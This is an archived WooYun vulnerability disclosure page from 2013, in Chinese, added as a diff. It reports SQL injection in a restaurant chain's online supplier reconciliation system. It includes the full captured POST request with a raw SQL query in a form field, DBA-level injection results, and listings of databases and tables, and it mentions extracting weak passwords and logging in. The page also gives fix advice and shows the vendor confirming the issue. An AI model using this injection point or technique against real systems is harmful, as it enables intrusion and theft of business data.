@@ -1,0 +1,330 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		海底捞某重要系统高权限SQL注射导致沦陷  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		海底捞某重要系统高权限SQL注射导致沦陷  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/小胖子">小胖子</a> 
+</li><li>提交时间：		2013-08-02 09:11</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-02：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-08-02：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-08-12：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-08-22：	细节向普通白帽子公开<br/>
+									2013-09-01：	细节向实习白帽子公开<br/>
+									2013-09-16：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">又是越权引起的，能越权的，你们基本不过滤，这下惨了哇。<br />
+<br />
+不想吃海底捞的黑客不是好领班。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">系统：在线对账系统http://duizhang.haidilao.com/<br />
+<br />
+<br />
+<br />
+这个就比较重要了吧。<br />
+<br />
+<br />
+<br />
+然后呢，发现还是比较严格的：<br />
+<br />
+</p><pre><code>1)供应商请注意:您用户名 前5位为 00000，<br />
+2)10分钟内连续输入5此错误密码，用户名自动锁定<br />
+3)被锁定之前，请点击忘记密码用邮件找回！<br />
+4）请尽快在个人资料和个人密码中维护邮箱和密码回答问题</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+看起来很严格，爆破是不可能了，但是，防不胜防啊。<br />
+<br />
+<br />
+<br />
+发现一个地址。<br />
+<br />
+<br />
+<br />
+http://duizhang.haidilao.com/log.aspx<br />
+<br />
+<br />
+<br />
+打开一看，越权查看，还是好多信息的。<br />
+<br />
+</p><p class="detail"><a href="../images/01210624b15b90e1236a582b80c31a41b74c3195.jpg" target="_blank"><img src="../images/01210624b15b90e1236a582b80c31a41b74c3195.jpg" alt=".jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+然后呢，随便在搜索处加个单引号就报错了。<br />
+<br />
+</p><p class="detail"><a href="../images/01210656579320d7b440bb663a966b26eeec84e1.jpg" target="_blank"><img src="../images/01210656579320d7b440bb663a966b26eeec84e1.jpg" alt="报错.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+然后呢，果断抓包。<br />
+<br />
+</p><pre><code>POST /log.aspx HTTP/1.1<br />
+Host: duizhang.haidilao.com<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 4785<br />
+Cache-Control: max-age=0<br />
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
+Origin: http://duizhang.haidilao.com<br />
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31<br />
+Content-Type: application/x-www-form-urlencoded<br />
+Referer: http://duizhang.haidilao.com/log.aspx<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8<br />
+Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br />
+Cookie: ASP.NET_SessionId=ezn0twltmlmhzptvkxzzubux<br />
+<br />
+__VIEWSTATE=%2FwEPDwUKMTQ4NTkwODY2Nw9kFgICAw9kFgICCQ88KwARAgAPFgQeC18hRGF0YUJvdW5kZx4LXyFJdGVtQ291bnQCB2QBEBYAFgAWABYCZg9kFhICAQ9kFgZmD2QWAmYPFQEBMWQCAQ8PFgIeBFRleHQFETIwMTMtOC0xIDEzOjM2OjUwZGQCAg8PFgIfAgXGAuWQjOatpVsyMDEzLTA3LTMxXeaVsOaNrueJh%2BWMuuiuouWNleOAkDEzLTI2LS0mZ3Q7MTMtMzbjgJHvvJo2NjnkuKo75oqT5Y%2BWc2Fw5p2h5pWwNjc35Liq44CQ57O757uf6KOF566xNjY55LiqLOiuvue9ruWIoOmZpDjkuKrjgJHjgII757O757uf5L%2Bd5a2Y5oiQ5YqfNjY55p2h77yB54mH5Yy65YWl5bqT6K6i5Y2V44CQMTMtMzYtLSZndDsxMy0zNuOAke%2B8mjI3MjnkuKo7c2Fw5oqT5Y%2BW5p2h5pWwMjcyOeS4qizlpITnkIblkI7mnaHmlbAyNzI55LiqO%2Bezu%2Be7n%2BaWsOWinjI3MjnkuKo75paw5aKe5aSx6LSlMOS4qjvmjpLpmaTku6XkuIvljZXmja7kuI3lkIzmraXvvJo7FgIeBXN0eWxlBRV3b3JkLWJyZWFrOmJyZWFrLWFsbDtkAgIPZBYGZg9kFgJmDxUBATJkAgEPDxYCHwIFETIwMTMtOC0xIDEyOjM3OjU0ZGQCAg8PFgIfAgXGAuWQjOatpVsyMDEzLTA3LTMxXeaVsOaNrueJh%2BWMuuiuouWNleOAkDEyLTI2LS0mZ3Q7MTItMzfjgJHvvJo2NjnkuKo75oqT5Y%2BWc2Fw5p2h5pWwNjc35Liq44CQ57O757uf6KOF566xNjY55LiqLOiuvue9ruWIoOmZpDjkuKrjgJHjgII757O757uf5L%2Bd5a2Y5oiQ5YqfNjY55p2h77yB54mH5Yy65YWl5bqT6K6i5Y2V44CQMTItMzctLSZndDsxMi0zN%2BOAke%2B8mjI3MjnkuKo7c2Fw5oqT5Y%2BW5p2h5pWwMjcyOeS4qizlpITnkIblkI7mnaHmlbAyNzI55LiqO%2Bezu%2Be7n%2BaWsOWinjI3MjnkuKo75paw5aKe5aSx6LSlMOS4qjvmjpLpmaTku6XkuIvljZXmja7kuI3lkIzmraXvvJo7FgIfAwUVd29yZC1icmVhazpicmVhay1hbGw7ZAIDD2QWBmYPZBYCZg8VAQEzZAIBDw8WAh8CBREyMDEzLTgtMSAxMTo0MDozNGRkAgIPDxYCHwIFxgLlkIzmraVbMjAxMy0wNy0zMV3mlbDmja7niYfljLrorqLljZXjgJAxMS0yOC0tJmd0OzExLTM544CR77yaNjY55LiqO%2BaKk%2BWPlnNhcOadoeaVsDY3N%2BS4quOAkOezu%2Be7n%2BijheeusTY2OeS4qizorr7nva7liKDpmaQ45Liq44CR44CCO%2Bezu%2Be7n%2BS%2FneWtmOaIkOWKnzY2Oeadoe%2B8geeJh%2BWMuuWFpeW6k%2BiuouWNleOAkDExLTM5LS0mZ3Q7MTEtNDDjgJHvvJoyNzI55LiqO3NhcOaKk%2BWPluadoeaVsDI3MjnkuKos5aSE55CG5ZCO5p2h5pWwMjcyOeS4qjvns7vnu5%2FmlrDlop4yNzI55LiqO%2BaWsOWinuWksei0pTDkuKo75o6S6Zmk5Lul5LiL5Y2V5o2u5LiN5ZCM5q2l77yaOxYCHwMFFXdvcmQtYnJlYWs6YnJlYWstYWxsO2QCBA9kFgZmD2QWAmYPFQEBNGQCAQ8PFgIfAgURMjAxMy04LTEgMTA6MzI6MzVkZAICDw8WAh8CBcYC5ZCM5q2lWzIwMTMtMDctMzFd5pWw5o2u54mH5Yy66K6i5Y2V44CQMTAtMjAtLSZndDsxMC0zMeOAke%2B8mjY2OeS4qjvmipPlj5ZzYXDmnaHmlbA2NzfkuKrjgJDns7vnu5%2Foo4XnrrE2NjnkuKos6K6%2B572u5Yig6ZmkOOS4quOAkeOAgjvns7vnu5%2Fkv53lrZjmiJDlip82NjnmnaHvvIHniYfljLrlhaXlupPorqLljZXjgJAxMC0zMS0tJmd0OzEwLTMy44CR77yaMjcyOeS4qjtzYXDmipPlj5bmnaHmlbAyNzI55LiqLOWkhOeQhuWQjuadoeaVsDI3MjnkuKo757O757uf5paw5aKeMjcyOeS4qjvmlrDlop7lpLHotKUw5LiqO%2BaOkumZpOS7peS4i%2BWNleaNruS4jeWQjOatpe%2B8mjsWAh8DBRV3b3JkLWJyZWFrOmJyZWFrLWFsbDtkAgUPZBYGZg9kFgJmDxUBATVkAgEPDxYCHwIFEDIwMTMtOC0xIDI6NDA6MjVkZAICDw8WAh8CBcYC5ZCM5q2lWzIwMTMtMDctMzFd5pWw5o2u54mH5Yy66K6i5Y2V44CQMDItMjgtLSZndDswMi0zOeOAke%2B8mjY2OeS4qjvmipPlj5ZzYXDmnaHmlbA2NzfkuKrjgJDns7vnu5%2Foo4XnrrE2NjnkuKos6K6%2B572u5Yig6ZmkOOS4quOAkeOAgjvns7vnu5%2Fkv53lrZjmiJDlip82NjnmnaHvvIHniYfljLrlhaXlupPorqLljZXjgJAwMi0zOS0tJmd0OzAyLTQw44CR77yaMjcyOeS4qjtzYXDmipPlj5bmnaHmlbAyNzI55LiqLOWkhOeQhuWQjuadoeaVsDI3MjnkuKo757O757uf5paw5aKeMjcyOeS4qjvmlrDlop7lpLHotKUw5LiqO%2BaOkumZpOS7peS4i%2BWNleaNruS4jeWQjOatpe%2B8mjsWAh8DBRV3b3JkLWJyZWFrOmJyZWFrLWFsbDtkAgYPZBYGZg9kFgJmDxUBATZkAgEPDxYCHwIFEDIwMTMtOC0xIDE6NTE6MzRkZAICDw8WAh8CBcYC5ZCM5q2lWzIwMTMtMDctMzFd5pWw5o2u54mH5Yy66K6i5Y2V44CQMDEtNDEtLSZndDswMS01MOOAke%2B8mjY2OeS4qjvmipPlj5ZzYXDmnaHmlbA2NzfkuKrjgJDns7vnu5%2Foo4XnrrE2NjnkuKos6K6%2B572u5Yig6ZmkOOS4quOAkeOAgjvns7vnu5%2Fkv53lrZjmiJDlip82NjnmnaHvvIHniYfljLrlhaXlupPorqLljZXjgJAwMS01MC0tJmd0OzAxLTUx44CR77yaMjcyOeS4qjtzYXDmipPlj5bmnaHmlbAyNzI55LiqLOWkhOeQhuWQjuadoeaVsDI3MjnkuKo757O757uf5paw5aKeMjcyOeS4qjvmlrDlop7lpLHotKUw5LiqO%2BaOkumZpOS7peS4i%2BWNleaNruS4jeWQjOatpe%2B8mjsWAh8DBRV3b3JkLWJyZWFrOmJyZWFrLWFsbDtkAgcPZBYGZg9kFgJmDxUBATdkAgEPDxYCHwIFEDIwMTMtOC0xIDA6MTc6MDRkZAICDw8WAh8CBcYC5ZCM5q2lWzIwMTMtMDctMzFd5pWw5o2u54mH5Yy66K6i5Y2V44CQMDAtMDItLSZndDswMC0xNuOAke%2B8mjY2OeS4qjvmipPlj5ZzYXDmnaHmlbA2NzfkuKrjgJDns7vnu5%2Foo4XnrrE2NjnkuKos6K6%2B572u5Yig6ZmkOOS4quOAkeOAgjvns7vnu5%2Fkv53lrZjmiJDlip82NjnmnaHvvIHniYfljLrlhaXlupPorqLljZXjgJAwMC0xNi0tJmd0OzAwLTE344CR77yaMjcyOeS4qjtzYXDmipPlj5bmnaHmlbAyNzI55LiqLOWkhOeQhuWQjuadoeaVsDI3MjnkuKo757O757uf5paw5aKeMjcyOeS4qjvmlrDlop7lpLHotKUw5LiqO%2BaOkumZpOS7peS4i%2BWNleaNruS4jeWQjOatpe%2B8mjsWAh8DBRV3b3JkLWJyZWFrOmJyZWFrLWFsbDtkAggPDxYCHgdWaXNpYmxlaGRkAgkPDxYCHwRoZGQYAQUIZ3JpZFZpZXcPPCsADAEIAgFkiu%2FFRkf4GqscekywiYKZ5eJAFRvy5zAYQwPriBzK5CE%3D&amp;__EVENTVALIDATION=%2FwEWCQLxr9G2AgLGz8WcCQLKoNWwCwL1jPXhAgKln%2FPuCgKd9rqDDAKkotGkBQK4teTSDAKthMSGBHWTZGiy63vMMMaHA0Uy8XiwkA9QjQ1nSY4smVEGS3tL&amp;tbxDateFrom=2013-08-01&amp;tbxDateTo=2013-08-01&amp;tbxMSG=&amp;btnSearch=%E6%90%9C%E7%B4%A2&amp;s_Action=&amp;s_sqlAll=select+top+1000+log_datetime%2Cmsg+from+log++where+msg+like+%27%25%E5%90%8C%E6%AD%A5%25%27++and+log_datetime+%3E%3D+%272013-08-01%27+and+log_datetime+%3C%3D+%272013-08-01+23%3A59%3A59%27+order+by+log_datetime+desc&amp;s_Search=+and+log_datetime+%3E%3D+%272013-08-01%27+and+log_datetime+%3C%3D+%272013-08-01+23%3A59%3A59%27&amp;hidTemp=</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+post注射看看。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01210731ff70d7b4e605b1c22b10da2ecab51a0a.jpg" target="_blank"><img src="../images/01210731ff70d7b4e605b1c22b10da2ecab51a0a.jpg" alt="DBA.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+发现权限挺高的，DBA。注射速度也是一流的。<br />
+<br />
+<br />
+<br />
+注射出很多弱口令啊，这下继续渗透你们就能摸准你们的习惯了。<br />
+<br />
+</p><p class="detail"><a href="../images/01210759104587a6d1ba5da7a15fadf4f7339d6c.jpg" target="_blank"><img src="../images/01210759104587a6d1ba5da7a15fadf4f7339d6c.jpg" alt=".jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+然后进入系统：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01210936dbcdf17c5b3a8dd0197646eb026511ed.jpg" target="_blank"><img src="../images/01210936dbcdf17c5b3a8dd0197646eb026511ed.jpg" alt=".jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+然后，好多信息啊，卧槽<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01211015faba9903a1e9043957d568654e2e16d2.jpg" target="_blank"><img src="../images/01211015faba9903a1e9043957d568654e2e16d2.jpg" alt=".jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+over。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>available databases [10]:<br />
+[*] dtest<br />
+[*] duizhang<br />
+[*] hetong<br />
+[*] master<br />
+[*] model<br />
+[*] msdb<br />
+[*] ReportServer<br />
+[*] ReportServerTempDB<br />
+[*] tempdb<br />
+[*] test1</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>Database: duizhang<br />
+[43 tables]<br />
++------------------------------------+<br />
+| dbo.BILL_DRAFT                     |<br />
+| dbo.BILL_FLOW_STACK                |<br />
+| dbo.BILL_FLOW_STATE_COM            |<br />
+| dbo.BILL_RELATION                  |<br />
+| dbo.Budget_BillLeave               |<br />
+| dbo.DOC_ISSUE                      |<br />
+| dbo.DOC_MIND                       |<br />
+| dbo.DOC_TEMPLATE                   |<br />
+| dbo.EVENTS                         |<br />
+| dbo.FLOWBASE                       |<br />
+| dbo.FLOW_LIST                      |<br />
+| dbo.HEADSHIP                       |<br />
+| dbo.HS_CASH_INIT                   |<br />
+| dbo.HS_POSITION                    |<br />
+| dbo.HS_SHIP                        |<br />
+| dbo.IDFACTORY                      |<br />
+| dbo.IDFACTORY2                     |<br />
+| dbo.R_ContractInfo                 |<br />
+| dbo.R_GatherInfo                   |<br />
+| dbo.R_Invoice                      |<br />
+| dbo.R_ProjPlanDoc                  |<br />
+| dbo.R_ProjectDetail                |<br />
+| dbo.R_ProjectJob                   |<br />
+| dbo.R_ProjectJobLog                |<br />
+| dbo.R_ProjectLog                   |<br />
+| dbo.R_ProjectMember                |<br />
+| dbo.R_ProjectPhase                 |<br />
+| dbo.R_ProjectProblem               |<br />
+| dbo.R_Relation_Order               |<br />
+| dbo.SUBJECT                        |<br />
+| dbo.USER_INFO                      |<br />
+| dbo.aspnet_Membership              |<br />
+| dbo.aspnet_Paths                   |<br />
+| dbo.aspnet_PersonalizationAllUsers |<br />
+| dbo.aspnet_PersonalizationPerUser  |<br />
+| dbo.aspnet_Profile                 |<br />
+| dbo.aspnet_Roles                   |<br />
+| dbo.aspnet_Users                   |<br />
+| dbo.aspnet_UsersInRoles            |<br />
+| dbo.budget_plan_sum_bgt            |<br />
+| dbo.v_hdl_order                    |<br />
+| dbo.v_hdl_order_special            |<br />
+| dbo.v_hdl_receieved_bill           |<br />
++------------------------------------+</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">0x1：越权切不可发生。<br />
+<br />
+0x2：注射好好过滤。<br />
+<br />
+0x3：数据库权限太高，hetong这个库是合同？这么不小心！！<br />
+<br />
+0x4：四川老乡，20rank拿来，礼物拿来，海底捞免费券！！！！！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/小胖子" title="小胖子">小胖子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-033223" title="海底捞某重要系统高权限SQL注射导致沦陷">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-08-02 10:02</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您提报的漏洞，我们正在努力修复；</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="33223";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
